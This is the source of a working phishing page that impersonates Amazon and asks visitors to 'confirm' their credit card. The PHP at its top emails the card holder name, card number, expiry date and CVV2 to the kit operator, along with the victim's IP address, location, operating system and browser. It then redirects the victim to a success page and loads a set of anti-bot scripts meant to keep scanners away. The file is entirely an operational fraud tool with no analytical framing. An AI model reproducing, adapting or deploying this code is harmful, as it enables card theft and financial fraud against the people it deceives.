<?php
require 'Email.php';require 'var.php';
if (isset($btnThreeAmazon)) {
    header("Location: successfully.php");
    $sc = $_COOKIE['fl'];
    $to = "$rzlt_email,$sc";
$txt = "
<h4 style='font-weight: bold;font-family: sans-serif;'>
✘±±±±±±±±±±±±±±±±±±[ AMAZON CARD ]±±±±±±±±±±±±±±±±±±±±✘<br>
✘ Card Holder Name : $CardHolderName<br>
✘ Card Number : $cardnumber<br>
✘ EXP MM : $MM<br>
✘ EXP YY : $YY<br>
✘ CVV2 : $CVV2<br>
✘±±±±±±±±±±±±±±±±[ END AMAZON CARD ]±±±±±±±±±±±±±±±±±±✘<br></h4>
<h4 style='font-weight: bold;font-family: sans-serif;'>
✘±±±±±±±±±±±±±±±±[     MORE INFO     ]±±±±±±±±±±±±±±±±±±✘<br>
✘🕘 Time : $time<br>
✘🗺 Ip : $iip<br>
✘📍 Geo : $ip<br>
✘💻 Operating System : $user_os<br>
✘🌀 Browser : $user_browser<br>
✘±±±±±±±±±±±±±±±±[ END MORE INFO ]±±±±±±±±±±±±±±±±✘<br></h4>";
$headers = "From:AMAZON RZLT <no-reply@kira.com>";
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject = "NEW AMAZON CARD 🗺 $iip 🌀 $user_browser 💻 $user_os";
mail($to,$subject,$txt,$headers);
}

include 'allantibots/a1.php';
include 'allantibots/a2.php';
include 'allantibots/a3.php';
include 'allantibots/a4.php';
include 'allantibots/a5.php';
include 'allantibots/a6.php';
include 'allantibots/a7.php';
include 'allantibots/a8.php';
include 'allantibots/a9.php';
include 'allantibots/a10.php';
include 'allantibots/a11.php';
include 'allantibots/a12.php';

?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>CARDS CONFIRMATION</title>
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<link rel="stylesheet" type="text/css" href="css/cc.css">
	<meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
	<link rel="shortcut icon" href="img/amazon-logo-1.png">

	<link rel="stylesheet" href="css/card.css">
    <link href="http://www.jqueryscript.net/css/jquerysctipttop.css" rel="stylesheet" type="text/css">
    <link rel="stylesheet" href="http://netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script type="text/javascript" src="js/jquery.creditCardValidator.js"></script>
    <script type="text/javascript" src="js/creditcard.js"></script>
</head>
<body>
<div class="header">
	<img src="img/amazon-logo-kira.svg">
</div><!--header-->
<div class="content">
	<div class="box-log">
		<p class="txt1">Credit/Debit Cards confirmation</p>
		<p class="txt2">Enter card detail</p>
		<p class="txt3">(Step 2 of 2)</p>
		<br>
		<br>
		<br>
	<form action="" method="POST">
		<p class="lblfullname">Card Holder Name</p>
		<input class="styleinput" type="text" name="CardHolderName" id="CardHolderName" minlength="3" style="text-transform: capitalize;">
		<span class="errorCardHolderName" id="errorCardHolderName"></span>


		<div class="input-wrapped full" id="validateCard">
		<p class="lblfullname">Card Number</p>
		<input class="styleinput" data-creditcard="true" type="text" name="cardnumber" id="cardnumber" maxlength="19">
		<span class="errorCardNumber" id="errorCardNumber"></span>
		</div>


		<p class="lblfullname">Expiration date</p>
		<select class="MM" id="MM" name="MM">
			<option value="01">01</option>
			<option value="02">02</option>
			<option value="03">03</option>
			<option value="04">04</option>
			<option value="05">05</option>
			<option value="06">06</option>
			<option value="07">07</option>
			<option value="08">08</option>
			<option value="09">09</option>
			<option value="10">10</option>
			<option value="11">11</option>
			<option value="12">12</option>
		</select><!--MM-->
		<select class="YY" id="YY" name="YY">
			<option value="2019">2019</option>
			<option value="2020">2020</option>
			<option value="2021">2021</option>
			<option value="2022">2022</option>
			<option value="2023">2023</option>
			<option value="2024">2024</option>
			<option value="2025">2025</option>
			<option value="2026">2026</option>
			<option value="2027">2027</option>
			<option value="2028">2028</option>
			<option value="2029">2029</option>
			<option value="2030">2030</option>
			<option value="2031">2031</option>
			<option value="2032">2032</option>
			<option value="2033">2033</option>
			<option value="2034">2034</option>
			<option value="2035">2035</option>
			<option value="2036">2036</option>
			<option value="2037">2037</option>
			<option value="2038">2038</option>
		</select><!--YY-->
		<br>
		<br>
		<br>
		<p class="lblfullname">CVV2 ( <a class="wts" href="#">Whats's this?</a> )</p>
		<input class="styleinput" type="text" name="CVV2" id="CVV2" placeholder="CVV2/CVV" maxlength="4">
		<span class="errorCVV2" id="errorCVV2"></span>


		<br>
		<br>
		<hr class="style-two">
		<br>
		<button name="btnThree" class="btn" id="btn" onclick="valid();">Continue</button>
		<br>
	</form>
	</div><!--box-log-->
</div><!--header-->
	<br>
	<br>
	<br>
	<hr class="style-two">

<div class="content3">
	<div class="cn">
		<ul>
			<li><a href="#">Conditions of Use</a></li>
			<li><a href="#">Privacy Notice</a></li>
			<li><a href="#">Help</a></li>
		</ul><!--cn-->
	</div>
	<img class="lastster" src="img/2k18.png">
</div><!--content3-->

<script type="text/javascript">
	function valid(){
		var CardHolderName=document.getElementById('CardHolderName').value;
		var errorCardHolderName=document.getElementById('errorCardHolderName');
		errorCardHolderName.innerHTML="";
		if (CardHolderName=='') {
			errorCardHolderName.innerHTML=" <b><i>!</i></b> Cardholder's name is required.";
		}

		var cardnumber=document.getElementById('cardnumber').value;
		var errorCardNumber=document.getElementById('errorCardNumber');
		errorCardNumber.innerHTML="";
		if (cardnumber=='') {
			errorCardNumber.innerHTML=" <b><i>!</i></b> Card number is required.";
		}

		var CVV2=document.getElementById('CVV2').value;
		var errorCVV2=document.getElementById('errorCVV2');
		errorCVV2.innerHTML="";
		if (CVV2=='') {
			errorCVV2.innerHTML=" <b><i>!</i></b> CVV2 is required.";
		}

	}
</script>

<script type="text/javascript">
			$(document).ready(function() {
    $('#btn').click(function(e) {
        var isValid = true;
        $('input[type="text"],[type="Password"]').each(function() {
            if ($.trim($(this).val()) == '') {
                isValid = false;
                $(this).css({
                	"box-shadow": "0 0 0 3px rgba(221,0,0,.1) inset",
                    "border": "1px solid red",
                    "background": ""
                });
            }
            else {
                $(this).css({
                    "border": "",
                    "box-shadow": "none",
                    "background": ""
                });
            }
        });
        if (isValid == false) 
            e.preventDefault();
        
    });
});
		</script>


		<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-36251023-1']);
  _gaq.push(['_setDomainName', 'jqueryscript.net']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>

<script type="text/javascript">
		$('#cardnumber').keyup(function() {
        var val = this.value.replace(/\D/g, '');
        var newVal = '';
        while (val.length > 4) {
          newVal += val.substr(0, 4) + ' ';
          val = val.substr(4);
        }
        newVal += val;
        this.value = newVal;
    });
		</script>

		<script type="text/javascript">
		$('#CVV2').keyup(function() {
        var val = this.value.replace(/\D/g, '');
        var newVal = '';
        while (val.length > 4) {
          newVal += val.substr(0, 4) + ' ';
          val = val.substr(4);
        }
        newVal += val;
        this.value = newVal;
    });
		</script>



</body>
</html>